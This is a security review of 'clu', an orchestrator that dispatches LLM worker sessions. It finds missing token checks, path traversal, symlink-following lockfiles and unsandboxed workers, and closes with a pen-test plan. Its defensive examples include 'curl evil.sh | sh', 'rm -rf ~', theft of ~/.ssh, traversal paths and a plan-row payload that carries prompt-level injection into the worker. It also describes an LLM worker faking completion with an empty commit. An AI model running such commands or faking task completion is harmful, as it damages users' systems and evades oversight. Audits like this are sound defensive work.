# clu — Red Team Review

## Verdict
**Do not point this at a real project yet.** The state machine is sound, but the worker contract is unauthenticated, the dispatch path can be hijacked by anything that can write a markdown file, and there is no quality gate between an LLM saying "done" and the plan advancing.

---

## Critical issues

### C1. `cmd_complete` accepts any caller — token is never checked. `cli.py:205-220`
The worker reports completion with `--phase X --commit SHA`. `cmd_complete` only checks that the *current claim* matches the phase; it never asks for the token, and `release_claim` is called with `expected_phase=` only (`cli.py:218`). Any process on the box — including a *stale* worker dispatched two leases ago — can record `EVENT_PHASE_COMPLETED` and free the claim. Same hole in `cmd_block` (`cli.py:223-231`) and `cmd_spawn` (no claim check at all). `state.release_claim` already supports `expected_token` (`state.py:204-217`); it just isn't wired. This is the headline bug. Mandatory fix: every worker-side subcommand must require `--token` and `release_claim(expected_token=...)`.

### C2. No code-quality gate between worker and "phase done." `supervisor.py:91-118`, `cli.py:205`
The supervisor trusts the worker's word. A hallucinating Claude session can run `git commit --allow-empty -m fake`, call `clu complete --phase a --commit deadbeef`, and the plan advances. There is no verification that the SHA exists, that tests pass, that the commit touches the phase's scope, or that `phase_file` was even read. For an LLM-driven worker with full shell, this is a code-quality black hole. Minimum gate: in `cmd_complete`, run `git cat-file -e <sha>` and reject unknown SHAs; optionally run `dispatch.verify_command` (a project-configured `make test` or similar) before appending `EVENT_PHASE_COMPLETED`.

### C3. Worker dispatch is arbitrary shell with `shell=True`. `dispatch.py:43-59`
`cmd = cmd_tmpl.format(...)` then `subprocess.Popen(cmd, shell=True)`. `shlex.quote` protects the *substituted values*, but it does NOT protect the template — and the template comes from `.orchestrator.json`, which is project-controlled. More importantly: the worker the template launches is an LLM with the user's full shell. There is zero sandboxing. `git push --force`, `rm -rf ~`, `curl evil.sh | sh`, exfiltration of `~/.ssh` — all in scope. Run the worker as a separate user, under a `sandbox-exec` profile, or in a container. At minimum: deny outbound network, deny writes outside `project_root`, deny `git push`.

### C4. Plan-markdown injection into `phase_id` → injection into `state_path`, log, and shell. `plan_parser.py:60-75`, `config.py:25-26`, `dispatch.py:60`
`phase_id` is the basename stem of `plan_file`, with the master prefix stripped. **No charset validation.** A row whose plan-file cell is `` `../../../tmp/pwn` `` yields `phase_id = "../../../tmp/pwn"`. That string is then:
- substituted into `cmd_tmpl` (escaped by `shlex.quote` — OK for argv but it stays in the printed log `dispatch.py:60` and downstream tools see the literal path),
- written into `events[]` and `current_claim.phase_id`,
- echoed to stderr in `print(f"dispatch: spawned `{cmd}`")` — fine,
- but never used as a path itself. The real damage is C5 below (plan_slug). Still, force `phase_id` through a regex like `^[a-z0-9][a-z0-9_-]{0,63}$` before claim. Anything else → halt.

### C5. `state_path()` does no slug sanitization → path traversal. `config.py:25-26`, `cli.py:99`
```
self.project_root / self.plan_dir / ORCHESTRATOR_DIR / f"{plan_slug}.state.json"
```
`args.plan = "../../../../etc/cron.d/pwn"` resolves to a write outside the project root. `cmd_init` will happily `mkdir -p` and drop a JSON blob anywhere the user can write. Combined with cron running this, that's local privilege amplification on a shared machine. Sanitize `plan_slug` (same regex as C4) and call `state_path.resolve().relative_to(project_root.resolve())` — refuse if it raises.

---

## High-severity issues

### H1. Lockfile is opened `"w"` — symlink-follow + truncation. `state.py:94-100`
`open(lock_path, "w")` follows symlinks. Pre-create `<plan>.state.json.lock` as a symlink to `~/.ssh/authorized_keys` or `/etc/cron.d/anything-writable-by-user`, and the next `tick` truncates that file. Use `os.open(lock_path, O_RDWR|O_CREAT|O_NOFOLLOW, 0o600)` then wrap with `os.fdopen`.

### H2. Stale-worker double-completion race. `cli.py:205-220`, `state.py:170-201`
Sequence: worker A is dispatched, hangs past TTL, supervisor tick releases the lease and dispatches worker B with a new token. Worker A finally finishes and calls `clu complete --phase X --commit OLDSHA`. Because there is no token check, A's call passes the phase-match guard (current claim is B, but the warning at `cli.py:208-213` does not abort — it just prints to stderr and continues). `EVENT_PHASE_COMPLETED` is appended; `release_claim(expected_phase=X)` releases B's live claim. Now phase X is "done" with A's commit, B is still running and will produce a second commit, and the next tick advances to the next phase while B is still mid-flight. Fix is the same as C1 plus: when the `claim is None or phase mismatch` branch fires, **exit non-zero** instead of warning.

### H3. No spawn cap → unbounded `spawned_tasks`. `cli.py:184-202`, `supervisor.py:120-131`
A worker running /simplify on a giant diff can call `clu spawn` 50 times. `supervisor` then refuses to mark the plan done while any task is pending (`supervisor.py:122-131`). Plan never completes; no automatic mechanism resolves a spawned task (status flips from `pending` to `done` are never written by any code path I can find). Pending tasks are a permanent halt by construction. Required: (a) per-phase spawn cap (`max_spawns_per_phase`), (b) a `clu task done <id>` command, (c) supervisor option to dispatch spawned tasks as phases rather than dead-end them.

### H4. No infinite-blocker guard. `cli.py:223-231`
Worker blocks. User answers. Worker re-dispatched. Worker blocks again on the same `question` text. State accepts another blocker (`add_blocker` assigns `q-N+1` blindly, `state.py:228`). Loop. Suggested guard: in `add_blocker`, refuse a new blocker on the same `phase_id` whose `question` matches any *answered* blocker within the last N events without an intervening `EVENT_PHASE_COMPLETED` — halt with `STATUS_HALTED` instead.

### H5. `SCHEMA_VERSION` is defined but never checked. `state.py:20`, `state.py:116-117`
`load()` just `json.loads(...)`. No `assert data["schema_version"] == SCHEMA_VERSION`. Docs claim "Schema version mismatch halts the supervisor." It doesn't. A v1 → v2 bump on existing state silently corrupts.

### H6. `attempts` counts `phase_started` events forever. `state.py:283-288`, `supervisor.py:103-111`
`prior_attempts` includes every historical start, including ones that succeeded and were re-spawned by a manual edit, or by spawned-task re-runs. There is no way to "reset" attempts after a fix. Once a phase has bounced 3 times you're halted forever even after the bug is fixed. Either decrement on successful completion (won't make sense semantically) or scope attempts to "since last `EVENT_PHASE_COMPLETED` for this phase."

### H7. Cron `PATH` swallows the dispatch failure. `dispatch.py:52-59`
`stdout=DEVNULL, stderr=DEVNULL` + `shell=True` means a missing `claude` binary returns 127 inside the subshell and is invisible. `Popen` returns immediately; supervisor thinks the worker is alive; lease ticks down for 30 min; max_attempts halts. User sees `halt` with no reason. Capture stderr to a per-dispatch log file (`<state>.dispatch.log`) and, if Popen returns non-zero within 1 s, surface the error in the next tick result.

---

## Medium / Low issues

### M1. `cmd_init` race window. `cli.py:113-122`
Existence is rechecked inside the lock — good. But `state_path.parent.mkdir` happens before the lock (`cli.py:114`). Harmless today, but if you later add per-project `.orchestrator/` invariants (e.g. permissions, ownership), enforce them inside the lock.

### M2. `resolve_blocker_answer` allows index out of range silently. `state.py:257-265`
`if idx < len(b["options"])` — but `idx < 0` is accepted via negative-index falsethrough, and a single-digit string `"9"` with three options falls through to "return as-is", which then becomes the literal answer `"9"`. Reject instead.

### M3. Atomic save tempfile leak on `KeyboardInterrupt`. `state.py:120-139`
`except Exception` doesn't catch `BaseException`. Ctrl-C between `mkstemp` and `os.replace` leaks a `*.tmp` file beside the state. Cosmetic but accumulates.

### M4. `release_if_expired` parses `lease_expires` as naive. `state.py:155-159`
`parse_iso(claim["lease_expires"])` returns a *naive* datetime (ISO_FMT has no tz suffix beyond the Z, which `fromisoformat` reads as UTC in 3.11+ but only if it's `+00:00`). Comparison `expires > _now_utc()` will `TypeError` if naive. On macOS Python 3.11.x `fromisoformat("…Z")` does parse as aware — fine — but break the moment anyone targets 3.10. Add a tz coerce.

### M5. `plan_parser` accepts cells `< 4` silently. `plan_parser.py:60-62`
Malformed master plans yield zero phases without warning. The caller maps this to `TickResult("error", "no Sessions index")` — same error string whether the header is missing or the rows are malformed. Distinguish.

### M6. Notification renderer escapes nothing. `notify.py:12-14`
Today it only prints to stderr — safe. But the docstring says "wire osascript / iMessage." If you pipe `b["question"]` into `osascript -e 'display notification "{q}"'`, you have a shell-injection vector funded by anyone who can edit `state.json`. Build that adapter with `subprocess.run([...], shell=False)` and explicit argv from day 1.

### M7. `events[]` grows without bound. `state.py:142-143`
Append-only with no rotation. Long-running plans on a tight disk → state.json balloons. Add a soft cap or periodic compaction (`events.jsonl` sidecar; main file holds projection only).

### L1. `_TOKEN_LEN = 8` (32 bits). `state.py:23`
Identification only, fine for solo use — but the moment you add token-auth (C1) you need ≥128 bits. Don't paint yourself into the corner; bump it now.

### L2. `prior_phase = ...` dead code. `state.py:177, 192`
Computed then `_ = prior_phase`. Remove or implement the hook.

### L3. `cfg.dispatch.kind` check is *after* substitution. `dispatch.py:50-51`
Cosmetic — substitution is pure. But if substitution ever raises (e.g. `KeyError` on unknown placeholder), you'll get a misleading traceback. Validate kind first.

---

## Out of scope for solo Mac, but flag for "multi-project / shared host"

- **State file is world-readable** under default umask. Contains every commit SHA, every question, every spawned task. Fine on solo laptop, not fine on a shared dev box. Force 0600.
- **Lockfile is named-after the state file in the same dir.** If you ever put state on NFS/SMB, `fcntl.flock` semantics degrade. Document "local FS only" or switch to `flock` + `fsync` of the directory.
- **`cron` runs as the user**, so any compromise of clu is full user-level compromise. If you ever invite a collaborator, the dispatch template becomes a remote-code-execution primitive against your account.
- **No audit signature on events.** Anyone can rewrite history in `state.json` undetectably. For solo this is fine; for any environment where the orchestrator is a system of record, add an HMAC chain over the event list keyed by a file outside `.orchestrator/`.

---

## Pen-test plan — 5 attacks I'd run first

1. **Stale-worker double-complete (H2/C1).** Init a plan, dispatch phase A, kill the worker, wait for lease expiry, let supervisor re-dispatch as worker B, then run `clu complete --phase a` from the OLD shell. Expected current behavior: phase marked done, B's claim cleared, B continues and produces a second commit on the next phase. **Prediction: passes (i.e. the attack works).**

2. **Path-traversal init (C5).** `clu init --project /tmp/proj --plan '../../../../tmp/pwn'`. Expected: a file at `/tmp/pwn.state.json` outside the project root. **Prediction: succeeds.**

3. **Symlink lockfile pre-seed (H1).** `ln -s ~/.bash_history plans/.orchestrator/foo.state.json.lock` then `clu tick`. Expected: `~/.bash_history` truncated to zero bytes. **Prediction: succeeds.**

4. **Malicious master-plan row (C4).** Add a Sessions-index row whose plan_file cell is `` `phase; curl evil/sh | sh` ``. Expected: `shlex.quote` neutralizes argv injection, but the `phase_id` carrying shell metacharacters lands in `state.json`, in logs, and (depending on the user's `cmd_tmpl`) inside heredocs / prompt templates passed to the Claude worker — which then has shell. **Prediction: argv-level injection blocked; prompt-level injection succeeds.**

5. **Runaway-spawn DoS (H3).** Worker loop that calls `clu spawn --source simplify --phase a --title "f"` 1000 times. Expected: `state.json` grows to ~MB, supervisor permanently refuses `plan_done`, and no command exists to drain the queue. **Prediction: succeeds; recovery requires hand-editing state.json.**

Fix C1, C2, C3, C5, H1, H3 before this thing runs against anything you care about.
